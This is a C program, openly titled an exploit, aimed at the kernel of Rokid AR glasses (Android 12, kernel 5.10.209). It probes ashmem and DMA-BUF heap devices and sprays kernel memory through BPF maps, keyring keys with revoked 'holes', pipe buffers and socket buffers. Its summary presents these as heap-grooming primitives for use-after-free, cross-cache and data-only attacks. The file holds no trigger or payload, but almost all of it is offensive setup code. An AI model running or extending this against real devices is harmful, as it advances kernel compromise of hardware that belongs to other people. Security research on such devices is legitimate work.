/*
 * Alternative Attack Surface Exploit
 * ====================================
 *
 * Target: Rokid AR Glasses (Android 12, Kernel 5.10.209)
 *
 * Attack Vectors:
 * 1. Ashmem - Anonymous shared memory vulnerabilities
 * 2. DMA-BUF Heap - System heap allocation primitives
 * 3. ION (if available) - Legacy memory allocator
 * 4. Binder - IPC primitive exploitation
 * 5. Pipe buffer - Classic spray target
 *
 * Key Findings from prior research:
 * - /dev/ashmem: world-writable
 * - /dev/dma_heap/system: may be accessible
 * - BPF: unprivileged_bpf_disabled=0
 * - Keyring: add_key syscall available
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <linux/bpf.h>

// ============================================================================
// Color Macros
// ============================================================================
#define RED "\033[31m"
#define GREEN "\033[32m"
#define YELLOW "\033[33m"
#define CYAN "\033[36m"
#define RESET "\033[0m"
#define BOLD "\033[1m"

// ============================================================================
// Ashmem Definitions
// ============================================================================
#define ASHMEM_NAME_LEN 256
#define ASHMEM_NAME_DEF "dev/ashmem"

#define __ASHMEMIOC 0x77
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])
#define ASHMEM_GET_NAME _IOR(__ASHMEMIOC, 2, char[ASHMEM_NAME_LEN])
#define ASHMEM_SET_SIZE _IOW(__ASHMEMIOC, 3, size_t)
#define ASHMEM_GET_SIZE _IO(__ASHMEMIOC, 4)
#define ASHMEM_SET_PROT_MASK _IOW(__ASHMEMIOC, 5, unsigned long)
#define ASHMEM_GET_PROT_MASK _IO(__ASHMEMIOC, 6)
#define ASHMEM_PIN _IOW(__ASHMEMIOC, 7, struct ashmem_pin)
#define ASHMEM_UNPIN _IOW(__ASHMEMIOC, 8, struct ashmem_pin)
#define ASHMEM_GET_PIN_STATUS _IO(__ASHMEMIOC, 9)
#define ASHMEM_PURGE_ALL_CACHES _IO(__ASHMEMIOC, 10)
#define ASHMEM_GET_FILE_ID _IOR(__ASHMEMIOC, 11, unsigned long)

struct ashmem_pin
{
    uint32_t offset;
    uint32_t len;
};

// ============================================================================
// DMA-BUF Heap Definitions
// ============================================================================
#define DMA_HEAP_IOC_MAGIC 'H'

#define DMA_HEAP_IOCTL_ALLOC _IOWR(DMA_HEAP_IOC_MAGIC, 0, struct dma_heap_allocation_data)

struct dma_heap_allocation_data
{
    uint64_t len;
    uint32_t fd;
    uint32_t fd_flags;
    uint64_t heap_flags;
};

// ============================================================================
// BPF Syscall Wrapper
// ============================================================================
#ifndef __NR_bpf
#define __NR_bpf 280
#endif

static int bpf_create_map(int key_size, int value_size, int max_entries)
{
    union bpf_attr attr = {
        .map_type = BPF_MAP_TYPE_HASH,
        .key_size = key_size,
        .value_size = value_size,
        .max_entries = max_entries,
    };
    return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd, void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key = (uint64_t)key,
        .value = (uint64_t)value,
        .flags = BPF_ANY,
    };
    return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}

// ============================================================================
// Keyring Syscall Wrapper
// ============================================================================
#ifndef __NR_add_key
#define __NR_add_key 217
#endif

#ifndef __NR_keyctl
#define __NR_keyctl 219
#endif

#define KEYCTL_REVOKE 3
#define KEY_SPEC_PROCESS_KEYRING -2

// ============================================================================
// Utility Functions
// ============================================================================

void print_banner(void)
{
    printf("\n");
    printf(BOLD CYAN "╔════════════════════════════════════════════════════════════════════╗\n" RESET);
    printf(BOLD CYAN "║" RESET "  " BOLD YELLOW "Alternative Attack Surface Exploit" RESET "                              " BOLD CYAN "║\n" RESET);
    printf(BOLD CYAN "║" RESET "  ────────────────────────────────────────────────────────────────  " BOLD CYAN "║\n" RESET);
    printf(BOLD CYAN "║" RESET "  " GREEN "Target" RESET ": Rokid AR Glasses (Kernel 5.10.209)                       " BOLD CYAN "║\n" RESET);
    printf(BOLD CYAN "║" RESET "  " GREEN "Focus" RESET ": Ashmem, DMA-BUF, BPF, Keyring, Pipe spray                 " BOLD CYAN "║\n" RESET);
    printf(BOLD CYAN "╚════════════════════════════════════════════════════════════════════╝\n" RESET);
    printf("\n");
}

void hexdump(const void *data, size_t size)
{
    const unsigned char *p = (const unsigned char *)data;
    for (size_t i = 0; i < size; i++)
    {
        if (i % 16 == 0)
            printf("    %04zx: ", i);
        printf("%02x ", p[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    if (size % 16 != 0)
        printf("\n");
}

// ============================================================================
// ATTACK 1: Ashmem Exploitation
// ============================================================================

void attack_ashmem(void)
{
    printf(BOLD YELLOW "\n════════════════════════════════════════════════════════════════\n" RESET);
    printf(BOLD YELLOW " ATTACK 1: Ashmem Memory Exploitation\n" RESET);
    printf(BOLD YELLOW "════════════════════════════════════════════════════════════════\n\n" RESET);

    int fd = open("/dev/ashmem", O_RDWR);
    if (fd < 0)
    {
        printf(RED "[-] Failed to open /dev/ashmem: %s\n" RESET, strerror(errno));
        return;
    }
    printf(GREEN "[+]" RESET " Opened /dev/ashmem (fd=%d)\n", fd);

    // Set name
    char name[] = "test_region";
    if (ioctl(fd, ASHMEM_SET_NAME, name) == 0)
    {
        printf(GREEN "[+]" RESET " Set name: %s\n", name);
    }

    // Set size
    size_t size = 4096 * 16; // 64KB
    if (ioctl(fd, ASHMEM_SET_SIZE, size) == 0)
    {
        printf(GREEN "[+]" RESET " Set size: %zu bytes\n", size);
    }

    // Get size back
    size_t got_size = ioctl(fd, ASHMEM_GET_SIZE);
    printf("    Verified size: %zu bytes\n", got_size);

    // Get protection mask
    unsigned long prot = ioctl(fd, ASHMEM_GET_PROT_MASK);
    printf("    Protection mask: 0x%lx\n", prot);

    // Try to get file ID (may leak info)
    unsigned long file_id = 0;
    if (ioctl(fd, ASHMEM_GET_FILE_ID, &file_id) == 0)
    {
        printf(YELLOW "[!]" RESET " File ID: 0x%lx (potential info leak)\n", file_id);
    }

    // Map the memory
    void *ptr = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (ptr == MAP_FAILED)
    {
        printf(RED "[-]" RESET " mmap failed: %s\n", strerror(errno));
    }
    else
    {
        printf(GREEN "[+]" RESET " mmap succeeded: %p\n", ptr);

        // Write pattern
        memset(ptr, 0x41, size);
        printf("    Wrote pattern 0x41 to entire region\n");

        // Test pin/unpin
        struct ashmem_pin pin = {
            .offset = 0,
            .len = 4096,
        };

        int pin_status = ioctl(fd, ASHMEM_GET_PIN_STATUS);
        printf("    Pin status: %d\n", pin_status);

        if (ioctl(fd, ASHMEM_UNPIN, &pin) == 0)
        {
            printf(GREEN "[+]" RESET " Unpin succeeded\n");

            // Try to purge
            if (ioctl(fd, ASHMEM_PURGE_ALL_CACHES) == 0)
            {
                printf(YELLOW "[!]" RESET " Purge all caches succeeded!\n");
            }

            // Re-pin
            if (ioctl(fd, ASHMEM_PIN, &pin) == 0)
            {
                printf(GREEN "[+]" RESET " Re-pin succeeded\n");
            }
        }

        // Check if data still there
        int match = 1;
        for (int i = 0; i < 256; i++)
        {
            if (((unsigned char *)ptr)[i] != 0x41)
            {
                match = 0;
                break;
            }
        }
        printf("    Data integrity after pin/unpin: %s\n", match ? "OK" : "MODIFIED!");

        munmap(ptr, size);
    }

    printf(CYAN "\n[Phase 2] Testing multiple ashmem regions...\n" RESET);

#define MAX_ASHMEM 64
    int ashmem_fds[MAX_ASHMEM];
    void *ashmem_ptrs[MAX_ASHMEM];
    int ashmem_count = 0;

    for (int i = 0; i < MAX_ASHMEM; i++)
    {
        int afd = open("/dev/ashmem", O_RDWR);
        if (afd < 0)
            break;

        if (ioctl(afd, ASHMEM_SET_SIZE, (size_t)4096) != 0)
        {
            close(afd);
            break;
        }

        void *p = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, afd, 0);
        if (p == MAP_FAILED)
        {
            close(afd);
            break;
        }

        ashmem_fds[ashmem_count] = afd;
        ashmem_ptrs[ashmem_count] = p;
        ashmem_count++;
    }

    printf("    Created %d ashmem regions\n", ashmem_count);

    // Write unique patterns
    for (int i = 0; i < ashmem_count; i++)
    {
        uint32_t *p = (uint32_t *)ashmem_ptrs[i];
        p[0] = 0xDEAD0000 | i;
        p[1] = i;
    }

    // Verify patterns
    int verified = 0;
    for (int i = 0; i < ashmem_count; i++)
    {
        uint32_t *p = (uint32_t *)ashmem_ptrs[i];
        if (p[0] == (0xDEAD0000 | i) && p[1] == (unsigned)i)
        {
            verified++;
        }
    }
    printf("    Pattern verification: %d/%d\n", verified, ashmem_count);

    // Cleanup
    for (int i = 0; i < ashmem_count; i++)
    {
        munmap(ashmem_ptrs[i], 4096);
        close(ashmem_fds[i]);
    }

    close(fd);
}

// ============================================================================
// ATTACK 2: DMA-BUF Heap Exploitation
// ============================================================================

void attack_dma_heap(void)
{
    printf(BOLD YELLOW "\n════════════════════════════════════════════════════════════════\n" RESET);
    printf(BOLD YELLOW " ATTACK 2: DMA-BUF Heap Exploitation\n" RESET);
    printf(BOLD YELLOW "════════════════════════════════════════════════════════════════\n\n" RESET);

    const char *heaps[] = {
        "/dev/dma_heap/system",
        "/dev/dma_heap/system-uncached",
        "/dev/dma_heap/qcom,system",
        "/dev/dma_heap/qcom,qseecom",
        "/dev/dma_heap/qcom,qseecom-ta-heap",
    };

    for (int i = 0; i < sizeof(heaps) / sizeof(heaps[0]); i++)
    {
        int fd = open(heaps[i], O_RDWR);
        if (fd < 0)
        {
            printf("[-] %s: %s\n", heaps[i], strerror(errno));
            continue;
        }

        printf(GREEN "[+]" RESET " Opened %s (fd=%d)\n", heaps[i], fd);

        // Try to allocate
        struct dma_heap_allocation_data alloc = {
            .len = 4096,
            .fd_flags = O_RDWR | O_CLOEXEC,
            .heap_flags = 0,
        };

        if (ioctl(fd, DMA_HEAP_IOCTL_ALLOC, &alloc) == 0)
        {
            printf(GREEN "[+]" RESET " Allocated DMA buffer: fd=%d, len=%llu\n",
                   alloc.fd, (unsigned long long)alloc.len);

            // Try to mmap the buffer
            void *ptr = mmap(NULL, alloc.len, PROT_READ | PROT_WRITE, MAP_SHARED, alloc.fd, 0);
            if (ptr != MAP_FAILED)
            {
                printf(GREEN "[+]" RESET " mmap succeeded: %p\n", ptr);

                // Read initial content
                printf("    Initial content:\n");
                hexdump(ptr, 64);

                munmap(ptr, alloc.len);
            }
            else
            {
                printf(YELLOW "[!]" RESET " mmap failed: %s\n", strerror(errno));
            }

            close(alloc.fd);
        }
        else
        {
            printf(YELLOW "[!]" RESET " Allocation failed: %s\n", strerror(errno));
        }

        close(fd);
    }
}

// ============================================================================
// ATTACK 3: BPF Heap Spray
// ============================================================================

void attack_bpf_spray(void)
{
    printf(BOLD YELLOW "\n════════════════════════════════════════════════════════════════\n" RESET);
    printf(BOLD YELLOW " ATTACK 3: BPF Heap Spray\n" RESET);
    printf(BOLD YELLOW "════════════════════════════════════════════════════════════════\n\n" RESET);

    // Test BPF map creation
    int map_fd = bpf_create_map(4, 128, 1024);
    if (map_fd < 0)
    {
        printf(RED "[-]" RESET " BPF map creation failed: %s\n", strerror(errno));
        return;
    }

    printf(GREEN "[+]" RESET " BPF map created (fd=%d)\n", map_fd);
    printf("    key_size=4, value_size=128, max_entries=1024\n");

    // Fill the map (heap spray)
    printf(CYAN "\n[Phase 1] Spraying BPF map entries...\n" RESET);

    int spray_count = 0;
    uint8_t value[128];
    memset(value, 0x42, sizeof(value));

    for (int i = 0; i < 1024; i++)
    {
        uint32_t key = i;
        if (bpf_update_elem(map_fd, &key, value) == 0)
        {
            spray_count++;
        }
    }

    printf("    Sprayed %d entries (128 bytes each)\n", spray_count);
    printf("    Total spray: %d KB\n", (spray_count * 128) / 1024);

    // Create multiple maps for more spray
    printf(CYAN "\n[Phase 2] Creating multiple BPF maps...\n" RESET);

#define MAX_MAPS 32
    int map_fds[MAX_MAPS];
    int map_count = 0;

    for (int i = 0; i < MAX_MAPS; i++)
    {
        int fd = bpf_create_map(4, 256, 512); // 256-byte values
        if (fd >= 0)
        {
            map_fds[map_count++] = fd;
        }
        else
        {
            break;
        }
    }

    printf("    Created %d BPF maps\n", map_count);

    // Fill all maps
    int total_entries = 0;
    for (int m = 0; m < map_count; m++)
    {
        uint8_t val[256];
        memset(val, 0x43 + m, sizeof(val));

        for (int i = 0; i < 512; i++)
        {
            uint32_t key = i;
            if (bpf_update_elem(map_fds[m], &key, val) == 0)
            {
                total_entries++;
            }
        }
    }

    printf("    Total entries across all maps: %d\n", total_entries);
    printf("    Total spray: %d KB\n", (total_entries * 256) / 1024);

    // Cleanup
    for (int i = 0; i < map_count; i++)
    {
        close(map_fds[i]);
    }
    close(map_fd);
}

// ============================================================================
// ATTACK 4: Keyring Spray
// ============================================================================

void attack_keyring_spray(void)
{
    printf(BOLD YELLOW "\n════════════════════════════════════════════════════════════════\n" RESET);
    printf(BOLD YELLOW " ATTACK 4: Keyring Spray\n" RESET);
    printf(BOLD YELLOW "════════════════════════════════════════════════════════════════\n\n" RESET);

    // Test keyring access
    char payload[128];
    memset(payload, 'K', sizeof(payload));

    int key_id = syscall(__NR_add_key, "user", "test_key", payload, sizeof(payload), KEY_SPEC_PROCESS_KEYRING);

    if (key_id < 0)
    {
        printf(RED "[-]" RESET " add_key failed: %s\n", strerror(errno));
        return;
    }

    printf(GREEN "[+]" RESET " Created key: id=%d\n", key_id);

    // Spray keys
    printf(CYAN "\n[Phase 1] Spraying keys...\n" RESET);

#define MAX_KEYS 256
    int key_ids[MAX_KEYS];
    int key_count = 0;

    for (int i = 0; i < MAX_KEYS; i++)
    {
        char name[32];
        snprintf(name, sizeof(name), "spray_key_%d", i);

        // Vary payload size to target different slabs
        size_t sizes[] = {64, 96, 128, 192, 256};
        size_t sz = sizes[i % 5];

        char *data = malloc(sz);
        if (!data)
            break;
        memset(data, 0x50 + (i % 10), sz);

        int kid = syscall(__NR_add_key, "user", name, data, sz, KEY_SPEC_PROCESS_KEYRING);
        free(data);

        if (kid >= 0)
        {
            key_ids[key_count++] = kid;
        }
    }

    printf("    Created %d keys\n", key_count);

    // Revoke and create holes
    printf(CYAN "\n[Phase 2] Creating holes (revoke every 4th key)...\n" RESET);

    int revoked = 0;
    for (int i = 0; i < key_count; i += 4)
    {
        if (syscall(__NR_keyctl, KEYCTL_REVOKE, key_ids[i]) == 0)
        {
            revoked++;
        }
    }
    printf("    Revoked %d keys\n", revoked);

    // Clean up remaining
    // (Keys will be cleaned up when process exits)
}

// ============================================================================
// ATTACK 5: Pipe Buffer Spray
// ============================================================================

void attack_pipe_spray(void)
{
    printf(BOLD YELLOW "\n════════════════════════════════════════════════════════════════\n" RESET);
    printf(BOLD YELLOW " ATTACK 5: Pipe Buffer Spray\n" RESET);
    printf(BOLD YELLOW "════════════════════════════════════════════════════════════════\n\n" RESET);

#define MAX_PIPES 64
    int pipes[MAX_PIPES][2];
    int pipe_count = 0;

    for (int i = 0; i < MAX_PIPES; i++)
    {
        if (pipe(pipes[i]) != 0)
            break;
        pipe_count++;
    }

    printf(GREEN "[+]" RESET " Created %d pipe pairs\n", pipe_count);

    // Get pipe buffer size
    if (pipe_count > 0)
    {
        int size = fcntl(pipes[0][0], F_GETPIPE_SZ);
        printf("    Pipe buffer size: %d bytes\n", size);
    }

    // Fill pipes with data
    printf(CYAN "\n[Phase 1] Filling pipe buffers...\n" RESET);

    char buf[4096];
    memset(buf, 0x50, sizeof(buf));

    int total_written = 0;
    for (int i = 0; i < pipe_count; i++)
    {
        // Make write end non-blocking
        fcntl(pipes[i][1], F_SETFL, O_NONBLOCK);

        while (1)
        {
            ssize_t n = write(pipes[i][1], buf, sizeof(buf));
            if (n <= 0)
                break;
            total_written += n;
        }
    }

    printf("    Total written: %d KB\n", total_written / 1024);

    // Close pipes
    for (int i = 0; i < pipe_count; i++)
    {
        close(pipes[i][0]);
        close(pipes[i][1]);
    }
}

// ============================================================================
// ATTACK 6: Socket Buffer Spray
// ============================================================================

void attack_socket_spray(void)
{
    printf(BOLD YELLOW "\n════════════════════════════════════════════════════════════════\n" RESET);
    printf(BOLD YELLOW " ATTACK 6: Socket Buffer Spray\n" RESET);
    printf(BOLD YELLOW "════════════════════════════════════════════════════════════════\n\n" RESET);

#define MAX_SOCKETS 32
    int sockets[MAX_SOCKETS];
    int socket_count = 0;

    // Create UDP sockets
    for (int i = 0; i < MAX_SOCKETS; i++)
    {
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        if (s < 0)
            break;
        sockets[socket_count++] = s;
    }

    printf(GREEN "[+]" RESET " Created %d UDP sockets\n", socket_count);

    // Set large receive buffers
    int buf_size = 1024 * 1024; // 1MB
    for (int i = 0; i < socket_count; i++)
    {
        setsockopt(sockets[i], SOL_SOCKET, SO_RCVBUF, &buf_size, sizeof(buf_size));
    }

    int actual_size = 0;
    socklen_t optlen = sizeof(actual_size);
    if (socket_count > 0)
    {
        getsockopt(sockets[0], SOL_SOCKET, SO_RCVBUF, &actual_size, &optlen);
        printf("    Receive buffer size: %d bytes\n", actual_size);
    }

    // Cleanup
    for (int i = 0; i < socket_count; i++)
    {
        close(sockets[i]);
    }
}

// ============================================================================
// Main
// ============================================================================

void print_summary(void)
{
    printf(BOLD CYAN "\n════════════════════════════════════════════════════════════════\n" RESET);
    printf(BOLD CYAN " Attack Surface Summary\n" RESET);
    printf(BOLD CYAN "════════════════════════════════════════════════════════════════\n\n" RESET);

    printf("  Available primitives:\n");
    printf("    - Ashmem: Large shared memory regions\n");
    printf("    - BPF Maps: Controlled kernel heap spray\n");
    printf("    - Keyring: Variable-size slab allocations\n");
    printf("    - Pipes: Page-sized allocations\n");
    printf("    - Sockets: Network buffer allocations\n");
    printf("\n");
    printf("  These primitives can be used for:\n");
    printf("    1. Heap grooming/spray for UAF exploitation\n");
    printf("    2. Cross-cache attacks\n");
    printf("    3. Data-only attacks (overwrite function pointers)\n");
}

int main(int argc, char **argv)
{
    print_banner();

    printf("[*] UID=%d, EUID=%d\n", getuid(), geteuid());

    attack_ashmem();
    attack_dma_heap();
    attack_bpf_spray();
    attack_keyring_spray();
    attack_pipe_spray();
    attack_socket_spray();

    print_summary();

    return 0;
}
